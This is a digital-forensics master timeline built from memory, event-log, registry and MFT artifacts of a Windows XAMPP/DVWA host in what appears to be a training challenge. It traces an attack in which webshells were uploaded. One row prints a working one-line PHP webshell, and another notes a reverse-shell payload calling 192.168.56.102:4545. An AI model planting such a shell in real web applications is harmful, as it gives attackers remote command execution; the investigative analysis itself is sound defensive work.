# Master Timeline

Preliminary merged timeline assembled by s2cb900. Timestamps are normalized to UTC where possible; when the source artifact reported `EEST`, the original source timezone is noted in the event text.

| Timestamp (UTC) | Source artifact | Command / parser | Event | Notes / evidence |
| --- | --- | --- | --- | --- |
| 2015-08-23 10:27:20Z | `inputs/memdump.mem` | `vol -f inputs/memdump.mem windows.pslist.PsList` | `System` process present / kernel session running | PID 4 create time from memory. |
| 2015-08-23 10:27:20Z | `inputs/memdump.mem` | `vol -f inputs/memdump.mem windows.pslist.PsList` | `smss.exe` started | PID 420. |
| 2015-08-23 10:30:34Z | `inputs/memdump.mem` | `vol -f inputs/memdump.mem windows.pslist.PsList` | Interactive shell `explorer.exe` started | PID 816; indicates user desktop session. |
| 2015-08-23 10:30:44Z | `inputs/memdump.mem` | `vol -f inputs/memdump.mem windows.pslist.PsList` + `windows.cmdline.CmdLine` | `cmd.exe` started under `explorer.exe` | PID 612, PPID 816, args `"C:\Windows\System32\cmd.exe"`. |
| 2015-08-23 10:32:17Z | `inputs/memdump.mem` | `vol -f inputs/memdump.mem windows.pslist.PsList` + `windows.cmdline.CmdLine` | XAMPP control panel started | PID 2768, args `"C:\xampp\xampp-control.exe"`. |
| 2015-08-23 10:32:21Z | `inputs/memdump.mem` | `vol -f inputs/memdump.mem windows.pslist.PsList` + `windows.cmdline.CmdLine` | Apache `httpd.exe` started | PID 2796, args `c:\xampp\apache\bin\httpd.exe`. |
| 2015-08-23 10:32:23Z | `inputs/memdump.mem` | `vol -f inputs/memdump.mem windows.pslist.PsList` + `windows.cmdline.CmdLine` | MySQL `mysqld.exe` started | PID 2804, args include `--defaults-file="c:\xampp\mysql\bin\my.ini" --standalone`. |
| 2015-08-23 10:32:25Z | `inputs/memdump.mem` | `vol -f inputs/memdump.mem windows.pslist.PsList` + `windows.cmdline.CmdLine` | FileZilla FTP server started | PID 2856, args `c:\xampp\filezillaftp\filezillaserver.exe -compat -start`. |
| 2015-08-23 10:32:26Z | `inputs/memdump.mem` | `vol -f inputs/memdump.mem windows.pslist.PsList` + `windows.cmdline.CmdLine` | Second Apache worker `httpd.exe` started | PID 2880, args `C:\xampp\apache\bin\httpd.exe -d C:/xampp/apache`. |
| 2015-08-23 21:15:01Z | `work/extracted/Application.evtx` | Python `Evtx` parser | Security Licensing event logged | Application EVTX, Event ID 902. |
| 2015-08-23 21:19:15Z | `work/extracted/Application.evtx` | Python `Evtx` parser | LoadPerf event logged | Application EVTX, Event ID 1001. |
| 2015-08-23 21:19:15Z | `work/extracted/Application.evtx` | Python `Evtx` parser | LoadPerf event logged | Application EVTX, Event ID 1000. |
| 2015-08-23 21:25:49Z | `inputs/s4a-challenge4` | `istat -o 2048 inputs/s4a-challenge4 42386-144-1` | `inetpub/` directory created | MFT inode `42386-144-1`; source timestamp `2015-08-24 00:25:49.031875000 (EEST)`. IIS web root present. |
| 2015-08-23 21:40:17Z | `inputs/s4a-challenge4` | `istat -o 2048 inputs/s4a-challenge4 12911-128-1` | XAMPP installer binary created on Administrator desktop | `Users/Administrator/Desktop/xampp-win32-5.6.11-1-VC11-installer.exe`, inode `12911-128-1`; source `2015-08-24 00:40:17.235000000 (EEST)`. |
| 2015-08-23 21:41:46Z | `inputs/s4a-challenge4` | `istat -o 2048 inputs/s4a-challenge4 42729-144-5` | `C:\xampp` directory created | Inode `42729-144-5`; source `2015-08-24 00:41:46.500625000 (EEST)`. |
| 2015-08-23 21:43:54Z | `work/extracted/s2cb901-hives/SOFTWARE` | Regipy parse of uninstall keys | VC++ 2008 Redistributable uninstall key last-written | Key `{FF66E9F6-83E7-3A3E-AF14-8DE9A809A6A4}` in `HKLM\...\Uninstall`. |
| 2015-08-23 21:44:05Z | `inputs/s4a-challenge4` | `istat -o 2048 inputs/s4a-challenge4 43323-144-5` | Start Menu `Programs/XAMPP` directory created | Inode `43323-144-5`; source `2015-08-24 00:44:05.891250000 (EEST)`. |
| 2015-08-23 21:44:08Z | `work/extracted/s2cb901-hives/SOFTWARE` | Regipy parse of uninstall keys | XAMPP uninstall key last-written | Key `xampp`, version `5.6.11-1`, publisher Bitnami, install location `C:\xampp`. |
| 2015-08-23 21:45:38Z | `work/extracted/Application.evtx` | Python `Evtx` parser | MySQL logged deprecated `key_buffer` option warning | Application EVTX, Event ID 100, provider `MySQL`. |
| 2015-08-23 21:45:38Z | `work/extracted/Application.evtx` | Python `Evtx` parser | MySQL logged deprecated implicit `TIMESTAMP` default warning | Event ID 100. |
| 2015-08-23 21:45:38Z | `work/extracted/Application.evtx` | Python `Evtx` parser | MySQL startup began as process 3136 | Message: `c:\xampp\mysql\bin\mysqld.exe (mysqld 5.6.25) starting as process 3136`. |
| 2015-08-23 21:45:41Z | `work/extracted/Application.evtx` | Python `Evtx` parser | MySQL bound to port 3306 | Message: `Server hostname (bind-address): '*' ; port: 3306`. |
| 2015-08-23 21:45:41Z | `work/extracted/Application.evtx` | Python `Evtx` parser | MySQL created IPv6 socket | Message: `Server socket created on IP: '::'`. |
| 2015-08-23 21:45:42Z | `work/extracted/Application.evtx` | Python `Evtx` parser | MySQL event scheduler loaded 0 events | Event ID 100. |
| 2015-08-23 21:45:42Z | `work/extracted/Application.evtx` | Python `Evtx` parser | MySQL ready for connections | Message includes `port: 3306  MySQL Community Server (GPL)`. |
| 2015-08-23 22:24:04Z | `work/extracted/Application.evtx` | Python `Evtx` parser | MySQL restarted as process 3612 | Event ID 100: `mysqld.exe ... starting as process 3612`. |
| 2015-08-23 22:24:06Z | `work/extracted/Application.evtx` | Python `Evtx` parser | MySQL detected unclean shutdown and began crash recovery | Messages: `Database was not shutdown normally!` and `Starting crash recovery.` |
| 2015-08-23 22:24:10Z | `work/extracted/Application.evtx` | Python `Evtx` parser | MySQL completed restart | Event ID 100: `InnoDB: 5.6.25 started`. |
| 2015-08-24 06:50:32Z | `work/extracted/System.evtx` | Python `Evtx` parser | `storflt` driver event recorded | System EVTX, Event ID 5. |
| 2015-08-24 06:51:38Z | `work/extracted/Security.evtx` | Python `Evtx` parser | Windows security auditing started | Security EVTX, Event ID 4608. |
| 2015-08-24 06:51:55Z | `work/extracted/System.evtx` | Python `Evtx` parser | Event Log service started | System EVTX, Event ID 6005. |
| 2015-08-24 06:51:55Z | `work/extracted/System.evtx` | Python `Evtx` parser | OS version logged as Windows 7 / 6.0 build 6001 SP1 multiprocessor free | System EVTX, Event ID 6009. |
| 2015-08-24 06:52:44Z | `work/extracted/System.evtx` | Python `Evtx` parser | Planned restart initiated by `winlogon.exe` | System EVTX, Event ID 1074, reason `Operating System: Upgrade (Planned)`. |
| 2015-08-24 06:52:54Z | `work/extracted/Security.evtx` | Python `Evtx` parser | System time changed | Security EVTX, Event ID 4616; previous date/time fields show `8/23/2015 11:52:54 PM`. |
| 2015-08-24 06:52:55Z | `work/extracted/System.evtx` | Python `Evtx` parser | Event Log service stopped | System EVTX, Event ID 6006. |
| 2015-08-24 06:53:39Z | `work/extracted/Security.evtx` | Python `Evtx` parser | Security auditing started again after reboot | Security EVTX, Event ID 4608. |
| 2015-08-24 06:54:08Z | `work/extracted/System.evtx` | Python `Evtx` parser | Event Log service started after reboot | System EVTX, Event ID 6005. |
| 2015-08-24 06:54:08Z | `work/extracted/System.evtx` | Python `Evtx` parser | OS version logged again after reboot | System EVTX, Event ID 6009. |
| 2015-08-24 06:54:30Z | `work/extracted/Security.evtx` | Python `Evtx` parser | Failed logon attempt against `Administrator` | Security EVTX, Event ID 4625, target user `Administrator`. |
| 2015-08-24 06:56:31Z | `work/extracted/Security.evtx` | Python `Evtx` parser | Second failed logon attempt against `Administrator` | Security EVTX, Event ID 4625, target user `Administrator`. |
| 2015-08-24 06:57:38Z | `work/extracted/Security.evtx` | Python `Evtx` parser | Explicit credentials used for `Administrator` logon | Security EVTX, Event ID 4648, target `Administrator`. |
| 2015-08-24 06:57:38Z | `work/extracted/Security.evtx` | Python `Evtx` parser | Successful `Administrator` logon with special privileges | Security EVTX, Event IDs 4624 and 4672; target SID ends in `-500`. |
| 2015-08-24 06:57:39Z | `work/extracted/Security.evtx` | Python `Evtx` parser | `Administrator` logoff | Security EVTX, Event ID 4634, logon type 2. |
| 2015-08-24 06:57:40Z | `work/extracted/Security.evtx` | Python `Evtx` parser | Second successful `Administrator` logon with explicit credentials | Security EVTX, Event IDs 4648 + 4624 + 4672. |
| 2015-08-24 06:59:23Z | `work/extracted/Application.evtx` | Python `Evtx` parser | LoadPerf event logged after reboot | Application EVTX, Event ID 1000. |
| 2015-08-24 07:14:15Z | `work/extracted/s2cb901-hives/SOFTWARE` | Regipy parse of uninstall keys | VirtualBox Guest Additions uninstall key last-written | `Oracle VM VirtualBox Guest Additions 4.3.30`, likely environment baseline software. |
| 2015-09-02 09:01:13Z | `inputs/memdump.mem` | `vol -f inputs/memdump.mem windows.pslist.PsList` | `wuauclt.exe` started | PID 2516. |
| 2015-09-02 09:28:30Z | `inputs/memdump.mem` | `vol -f inputs/memdump.mem windows.pslist.PsList` + `windows.cmdline.CmdLine` | Second interactive `cmd.exe` observed | PID 1972 under `explorer.exe`. |
| 2015-09-03 06:08:35Z | `inputs/memdump.mem` | `vol -f inputs/memdump.mem windows.netscan.NetScan` | Windows Time (`svchost.exe`) opened UDP/123 | PID 1108. |
| 2015-09-03 06:08:35Z | `inputs/memdump.mem` | `vol -f inputs/memdump.mem windows.netscan.NetScan` | NetBIOS datagram service on `192.168.56.101:138` present | PID 4 / `System`. |
| 2015-09-03 06:08:37Z | `inputs/memdump.mem` | `vol -f inputs/memdump.mem windows.netscan.NetScan` | LLMNR / name resolution UDP/5355 listener present | PID 1204 / `svchost.exe`. |
| 2015-09-03 07:03:06Z | `inputs/memdump.mem` | `vol -f inputs/memdump.mem windows.pslist.PsList` | `TrustedInstaller.exe` started | PID 3848. |
| 2015-09-03 07:03:37Z | `inputs/memdump.mem` | `vol -f inputs/memdump.mem windows.pslist.PsList` + `windows.cmdline.CmdLine` | `FTK Imager.exe` launched from VirtualBox shared folder | PID 2120, args `"\\Vboxsvr\101\FTK-Imager\FTK Imager.exe"`; likely examiner activity. |
| 2015-09-03 07:10:15Z | `inputs/s4a-challenge4` | `istat -o 2048 inputs/s4a-challenge4 62330-128-3` | One-line PHP webshell created in DVWA uploads | `xampp/htdocs/DVWA/hackable/uploads/phpshell.php`, inode `62330-128-3`; content `<?php system($_GET["cmd"]); ?>`; source `2015-09-03 10:10:15.978652300 (EEST)`. |
| 2015-09-03 07:20:14Z | `inputs/s4a-challenge4` | `istat -o 2048 inputs/s4a-challenge4 62338-128-4` | Deleted `c99` PHP webshell placeholder in Administrator temp | `Users/Administrator/AppData/Local/Temp/c99 (2).php`, inode `62338-128-4`, not allocated; classic webshell filename; source `2015-09-03 10:20:14.400527300 (EEST)`. |
| 2015-09-03 07:31:30Z | `inputs/s4a-challenge4` | `istat -o 2048 inputs/s4a-challenge4 62337-128-4` | Reverse-shell PHP payload created in DVWA uploads | `xampp/htdocs/DVWA/hackable/uploads/phpshell2.php`, inode `62337-128-4`; payload connects to `192.168.56.102:4545`; source `2015-09-03 10:31:30.259902300 (EEST)`. |
| 2015-09-03 10:03:20Z | `inputs/memdump.mem` | `vol -f inputs/memdump.mem windows.netscan.NetScan` | WS-Discovery listeners present on UDP/3702 | PID 1108 / `svchost.exe`; several entries created at this time. |
| 2015-09-03 10:03:55Z | `inputs/memdump.mem` | `vol -f inputs/memdump.mem windows.netscan.NetScan` | Additional UDP listener observed on high port 55813 | PID 1204 / `svchost.exe`. |
| 2015-09-03 10:04:08Z | `inputs/memdump.mem` | `vol -f inputs/memdump.mem windows.netscan.NetScan` | `VBoxService.exe` UDP activity observed | Memory-only network artifact, PID 836. |
